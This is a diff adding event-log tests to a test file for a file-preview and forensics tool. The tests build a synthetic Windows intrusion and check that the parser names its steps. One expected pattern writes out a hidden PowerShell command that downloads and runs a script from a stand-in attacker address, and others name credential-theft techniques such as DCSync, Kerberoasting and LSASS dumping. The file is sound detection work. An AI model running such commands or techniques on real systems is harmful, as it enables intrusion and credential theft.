@@ -30,6 +30,13 @@
  *      same) — the lure's interpreter, padded arguments, icon, window,
  *      tracker and MAC, appended bytes; the Prefetch's runs, path, files,
  *      volume; Xpress Huffman round trips over blocks; cut short, said
+ *  14. event logs (42j): an intrusion built at run time (tests/lib/evtx.mjs;
+ *      python-evtx reads it the same) — spraying, then a success from the
+ *      same address; PsExec, a task, WMI, an admin added; encoded
+ *      PowerShell, Office starting a shell, rclone; DCSync, Kerberoasting,
+ *      AS-REP, LSASS; Defender; the log cleared — each named; every value
+ *      type, times to the tick; gaps, a changed chunk, the flags; a record
+ *      built to expand refused; cut short and mutated, never thrown
  *  12. macros (42h): MS-OVBA's own example vectors decompressed; DPB values
  *      Excel wrote decrypted; projects built at run time (tests/lib/vba.mjs)
  *      in .docm, .doc, .xls, .ppt and OpenDocument Basic read the same way:
@@ -85,7 +92,7 @@ import { parseMachoFile } from "../../web/src/preview/binary/macho.ts";
 import { identify, isProgram } from "../../web/src/preview/binary/sniff.ts";
 import { extractStrings, stringFindings } from "../../web/src/preview/binary/strings.ts";
 import { capabilities } from "../../web/src/preview/binary/capabilities.ts";
-import { commonNames, entropy } from "../../web/src/preview/binary/read.ts";
+import { commonNames, entropy, trimNul } from "../../web/src/preview/binary/read.ts";
 import { findBytes } from "../../web/src/preview/binary/find.ts";
 import { binaryFacts } from "../../web/src/preview/facts/binary.ts";
 import { decompress, decryptValue } from "../../web/src/preview/vba/ovba.ts";
@@ -98,6 +105,9 @@ import { parsePrefetch } from "../../web/src/preview/forensic/prefetch.ts";
 import { xpressHuffman } from "../../web/src/preview/forensic/xpress.ts";
 import { lnkFacts, prefetchFacts } from "../../web/src/preview/facts/forensic.ts";
 import { buildLnk, buildPrefetch, xpressCompress } from "../lib/forensic.mjs";
+import { crc32 as evtxCrc32, isEvtx, parseEvtx } from "../../web/src/preview/forensic/evtx.ts";
+import { brief, describe, evtxFindings, levelOf, shown } from "../../web/src/preview/facts/evtx.ts";
+import { amplifier, buildEvtx, intrusion } from "../lib/evtx.mjs";
 import { compress, encryptValue, hostileProject, oleWithVba, odfWithBasic, pcode, pptWithVba, vbaProject, withVba } from "../lib/vba.mjs";
 
 const fixture = (name: string) => new Uint8Array(readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url)));
@@ -818,4 +828,110 @@ for (const want of [/A Windows Prefetch file \(Windows 10\/11, compressed\): RCL
 assert.match(said(prefetchFacts(pp, "SVCHOST.EXE-1A2B3C4D.pf")), /Named for SVCHOST\.EXE \(1A2B3C4D\), but its header says RCLONE\.EXE/, "a renamed Prefetch file");
 assert.equal(parsePrefetch(pfBytes.subarray(0, 40)), null, "cut inside its compressed data: nothing, not a crash");
 
-console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named; text: secrets found and masked (placeholders not), a dropper's every line named and its -EncodedCommand decoded, a reverse shell, a web shell, encoded and obfuscated scripts; JSON nesting refused before parsing, JSON Lines counted, XML entities and outside DTDs named and never parsed; Korean and UTF-16 text decoded; programs: mingw, gcc and clang builds read as pefile, readelf and llvm-otool read them (imphash, version, exports, ad hoc signature), the hostile PE's injection, packer, overlay, forged signature and ransom strings named, cut-short headers said and never thrown; macros: MS-OVBA's own vectors, Excel's own DPB values, projects in .docm, .xlsm, .pptm, .doc, .xls, .ppt and OpenDocument Basic read alike — auto-run, Shell, the shellcode Declares, stomping, hidden modules, a locked project, a form's text");
+// ── 14. Event logs (42j) ─────────────────────────────────────────────
+// An intrusion's worth of events, built when the test runs (tests/lib/evtx.mjs;
+// python-evtx reads what it writes the same way, checked when it was written).
+const SA = "Microsoft-Windows-Security-Auditing";
+const attack = intrusion();
+const atkBytes = buildEvtx(attack, { start: "2024-03-01T09:00:00Z" });
+assert.equal(isEvtx(atkBytes), true);
+const atk = (await parseEvtx(atkBytes))!;
+assert.deepEqual([atk.events.length, atk.chunks, atk.badChecksums, atk.gaps, atk.warnings, atk.dirty, atk.nextRecord], [attack.length, 1, [], [], [], false, attack.length + 1]);
+const first = atk.events[0]!;
+assert.deepEqual([first.record, first.provider, first.eventId, first.keywords, first.channel, first.computer, first.time, levelOf(first)], [1, SA, 4625, "0x8010000000000000", "Security", "WKS-01.corp.example", "2024-03-01T09:00:00.0000000Z", "Audit failure"]);
+assert.deepEqual(first.data[3], ["IpAddress", "203.0.113.9"], "EventData by name, from a nested Binary XML value");
+const rdpEvent = atk.events[30]!;
+assert.deepEqual([rdpEvent.user, brief(rdpEvent), describe(rdpEvent)], ["S-1-5-18", "CORP\\user3 · by Remote Desktop · from 203.0.113.9 · KALI", "An account logged on"]);
+assert.deepEqual(atk.events.at(-1)!.data.slice(0, 2), [["SubjectUserSid", "S-1-5-21-1-2-3-1104"], ["SubjectUserName", "user3"]], "UserData's leaves, by element name");
+assert.equal(String.fromCharCode(...atkBytes.subarray(atk.events[5]!.offset, atk.events[5]!.offset + 2)), "**", "each event knows where its record starts");
+
+const evf = evtxFindings(atk);
+const evfs = said(evf.facts);
+for (const want of [
+	/^A Windows event log \(Security\): 51 events, 2024-03-01 09:00:00 to 2024-03-01 09:00:50 UTC, from WKS-01\.corp\.example$/m,
+	/The Security log was cleared at 2024-03-01 09:00:50 UTC by CORP\\user3 — what an intruder does on the way out/,
+	/The audit policy was changed 1 time, first at .* by CORP\\user3/,
+	/Defender found malware 1 time: HackTool:Win64\/Mimikatz in “C:\\Users\\Public\\m\.exe”/,
+	/Defender's real-time protection was turned off 1 time/,
+	/30 failed logons: from 203\.0\.113\.9 ×30; for CORP\\user0 ×5, CORP\\user1 ×5, CORP\\user2 ×4, \+4 more/,
+	/203\.0\.113\.9 tried 7 different accounts — password spraying/,
+	/…then 203\.0\.113\.9 logged on as CORP\\user3 by Remote Desktop at 2024-03-01 09:00:30 UTC — after 30 failures: guessed\?/,
+	/Remote Desktop logons from 203\.0\.113\.9 ×1 — 203\.0\.113\.9 is on the internet/,
+	/Service “PSEXESVC” installed at .*: “%SystemRoot%\\PSEXESVC\.exe” as LocalSystem — PsExec's: a command run from another computer/,
+	/Scheduled task “\\Microsoft\\Windows\\Updater” created at .*: runs “powershell\.exe -w hidden -nop -c iex\(iwr http:\/\/203\.0\.113\.9\/s\.ps1\)” — it downloads and runs code \(PowerShell\)/,
+	/1 permanent WMI subscription registered — code run on an event/,
+	/Account “CORP\\svc-backup” created at .* by CORP\\user3/,
+	/“CORP\\svc-backup \(S-1-5-21-1-2-3-1105\)” added to “Builtin\\Administrators” .* — a group that runs the computer/,
+	/A command that downloads and runs code \(PowerShell\)/,
+	/A PowerShell -EncodedCommand at .*, decoded: “whoami \/all”/,
+	/1 PowerShell script block Windows itself logged as suspicious/,
+	/RCLONE\.EXE ran 1 time \(first at .*\): copies files to cloud storage/,
+	/WINWORD\.EXE started powershell\.exe at .* — a document running a command \(a macro\)/,
+	/CORP\\user3 used directory replication rights at .* DCSync/,
+	/user3@CORP asked for RC4 service tickets for 3 services \(MSSQLSvc\/db1 · HTTP\/web1 · CIFS\/fs1\) — Kerberoasting/,
+	/Tickets issued without pre-authentication for legacy-svc — .*AS-REP roasting/,
+	/“C:\\Users\\Public\\procdump64\.exe” opened LSASS \(access 0x1fffff\)/,
+	/Administrative shares \(C\$, ADMIN\$\) reached 1 time: CORP\\user3 from 203\.0\.113\.9 ×1/,
+]) assert.match(evfs, want);
+assert.equal(evf.facts.filter((f) => f.level === "warn").length >= 20, true, "the intrusion is warned of, not just described");
+for (const r of [31, 34, 50]) assert.ok(evf.notable.has(r), `record ${r} marked for the table`);
+assert.match(evf.notable.get(31)!, /a logon from 203\.0\.113\.9, which had failed 30 times/);
+// An honest log says what it is and warns of nothing.
+const quiet = (await parseEvtx(buildEvtx(Array.from({ length: 40 }, (_, i) => ({ provider: "Service Control Manager", id: 7036, channel: "System", level: 4, data: [["param1", "Windows Update"], ["param2", i % 2 ? "running" : "stopped"]] })))))!;
+assert.deepEqual(evtxFindings(quiet).facts.filter((f) => f.level === "warn"), [], "a service starting and stopping is not an incident");
+assert.match(said(evtxFindings(quiet).facts), /Most frequent: 7036 \(A service changed state\) ×40/);
+
+const rloLog = (await parseEvtx(buildEvtx([{ provider: "Service Control Manager", id: 7045, channel: "System", data: [["ServiceName", "Updater"], ["ImagePath", "C:\\Users\\Public\\invoice\u202efdp.exe"], ["AccountName", "LocalSystem"]] }])))!;
+assert.match(said(evtxFindings(rloLog).facts), /“C:\\Users\\Public\\invoice\[RLO\]fdp\.exe” as LocalSystem — from a folder anyone can write to/, "a value's right-to-left override shown, not obeyed");
+assert.doesNotMatch(said(evtxFindings(rloLog).facts), /\u202e/);
+
+// Every value type, as Event Viewer (and python-evtx) render it — times to the tick.
+const typedLog = (await parseEvtx(buildEvtx([{ provider: "Test", id: 1, channel: "Application", time: "2024-03-01T10:00:00.1234567Z", data: [["u8", 7, "u8"], ["u16", 65535, "u16"], ["u32", 4000000000, "u32"], ["u64", "18446744073709551615", "u64"], ["b", true, "bool"], ["bin", "deadbeef", "binary"], ["g", "{54849625-5478-4994-a5ba-3e3b0328c30d}", "guid"], ["ft", "2024-03-01T10:00:00.1234567Z", "filetime"], ["h32", 0x1234, "hex32"], ["h64", "0xfeedface", "hex64"], ["sid", "S-1-5-21-2603537626-3982775912-406486804-1000", "sid"], ["arr", ["a", "", "b"], "strings"], ["Data 0", "positional"], ["empty", ""], ["nul", null], ["ctl", "\u0003x\u202e"]] }])))!;
+assert.equal(typedLog.events[0]!.time, "2024-03-01T10:00:00.1234567Z", "TimeCreated to 100 ns (a float would lose it)");
+assert.deepEqual(typedLog.events[0]!.data, [["u8", "7"], ["u16", "65535"], ["u32", "4000000000"], ["u64", "18446744073709551615"], ["b", "true"], ["bin", "DEADBEEF"], ["g", "{54849625-5478-4994-a5ba-3e3b0328c30d}"], ["ft", "2024-03-01T10:00:00.1234567Z"], ["h32", "0x00001234"], ["h64", "0x00000000feedface"], ["sid", "S-1-5-21-2603537626-3982775912-406486804-1000"], ["arr", "a\n\nb"], ["Data 0", "positional"], ["empty", ""], ["nul", ""], ["ctl", "\u0003x\u202e"]]);
+assert.equal(shown("\u0003x\u202e"), "\u2403x[RLO]", "what would hide shown, not obeyed");
+
+// Integrity: a gap, a changed chunk, the flags, a log that begins late; many chunks.
+const filler = (n: number, from = 0) => Array.from({ length: n }, (_, i) => ({ provider: SA, id: 4688, data: [["NewProcessName", `C:\\Windows\\System32\\tool${from + i}.exe`], ["CommandLine", `tool${from + i}.exe ${"-x ".repeat(i % 40)}`]] }));
+const gapped = (await parseEvtx(buildEvtx([...filler(10), { ...filler(1, 10)[0]!, record: 16 }, ...filler(5, 11)])))!;
+assert.deepEqual(gapped.gaps, [{ after: 10, missing: 5 }]);
+assert.match(said(evtxFindings(gapped).facts), /Record numbers skip 5 records after #10 — records taken out of the log/);
+const tampered = (await parseEvtx(buildEvtx(filler(20), { tamper: { chunk: 0, at: 700 } })))!;
+assert.deepEqual(tampered.badChecksums, [0]);
+assert.match(said(evtxFindings(tampered).facts), /1 chunk of records do not match their checksums/);
+const late = (await parseEvtx(buildEvtx(filler(3), { firstRecord: 500, dirty: true, full: true })))!;
+assert.deepEqual([late.dirty, late.full, late.events[0]!.record], [true, true, 500]);
+for (const want of [/It begins at record #500/, /Not closed cleanly/, /Marked full/]) assert.match(said(evtxFindings(late).facts), want);
+const big = (await parseEvtx(buildEvtx(filler(1500))))!;
+assert.ok(big.chunks >= 3, `${big.chunks} chunks`);
+assert.deepEqual([big.events.length, big.events.at(-1)!.record, big.gaps, big.badChecksums], [1500, 1500, [], []], "every chunk's records, each chunk's templates and names its own");
+
+// Hostile: a record built to expand (refused, the rest read), cut short, mutated.
+let t = performance.now();
+const amp = (await parseEvtx(buildEvtx([filler(1)[0]!, amplifier(), filler(1, 1)[0]!])))!;
+assert.deepEqual([amp.events.map((e) => e.record), amp.warnings], [[1, 3], ["record 2 could not be read (it expands past 20,000 nodes — built to exhaust a reader)"]]);
+assert.ok(performance.now() - t < 2000, "and quickly");
+assert.equal(await parseEvtx(new Uint8Array(4096)), null, "not an event log");
+assert.deepEqual((await parseEvtx(atkBytes.subarray(0, 4096 + 30_000)))!.events, [], "cut inside its first chunk: nothing, not a crash");
+let seed = 42;
+const rnd = () => (seed = (Math.imul(seed, 1103515245) + 12345) >>> 0) / 2 ** 32;
+for (let i = 0; i < 60; i++) {
+	const b = atkBytes.slice();
+	for (let k = 0, n = 1 + Math.floor(rnd() * 48); k < n; k++) b[4096 + Math.floor(rnd() * (b.length - 4096))] = rnd() < 0.5 ? Math.floor(rnd() * 256) : [0, 0xff, 0x0c, 0x0f, 0x01, 0x41, 0x21, 0x81][Math.floor(rnd() * 8)]!;
+	t = performance.now();
+	const l = await parseEvtx(b); // (never throws: malformed records are warnings)
+	if (l) evtxFindings(l);
+	assert.ok(performance.now() - t < 2000, `mutation ${i} read in time`);
+}
+// What the script triage reads is capped in all (a log of 32 KiB script blocks could hold gigabytes).
+const scriptsLog = (await parseEvtx(buildEvtx(Array.from({ length: 1100 }, (_, i) => ({ provider: "Microsoft-Windows-PowerShell", id: 4104, data: [["ScriptBlockText", `# ${i}\n${"Write-Output 1;".repeat(1066)}`]] })))))!;
+t = performance.now();
+assert.match(said(evtxFindings(scriptsLog).facts), /100 more command lines and scripts not read by the script triage \(it reads 16 million characters at most\)/);
+assert.ok(performance.now() - t < 3000, "16 million characters triaged in time");
+// The NUL trim the fuzzing found: linear, where /\0+$/ backtracks on every NUL.
+t = performance.now();
+assert.equal(trimNul(`${"\0".repeat(200_000)}x\0\0`), `${"\0".repeat(200_000)}x`);
+assert.ok(performance.now() - t < 100, "200,000 NULs before the end: linear");
+assert.equal(evtxCrc32(new TextEncoder().encode("123456789")), 0xcbf43926, "CRC-32's check value (the event-log chunks' own)");
+
+console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named; text: secrets found and masked (placeholders not), a dropper's every line named and its -EncodedCommand decoded, a reverse shell, a web shell, encoded and obfuscated scripts; JSON nesting refused before parsing, JSON Lines counted, XML entities and outside DTDs named and never parsed; Korean and UTF-16 text decoded; programs: mingw, gcc and clang builds read as pefile, readelf and llvm-otool read them (imphash, version, exports, ad hoc signature), the hostile PE's injection, packer, overlay, forged signature and ransom strings named, cut-short headers said and never thrown; macros: MS-OVBA's own vectors, Excel's own DPB values, projects in .docm, .xlsm, .pptm, .doc, .xls, .ppt and OpenDocument Basic read alike — auto-run, Shell, the shellcode Declares, stomping, hidden modules, a locked project, a form's text; forensic formats: a lure shortcut and a Prefetch file read; event logs: an intrusion's every step named, every value type as Event Viewer shows it, a gap and a changed chunk found, a record built to expand refused, mutations never thrown");
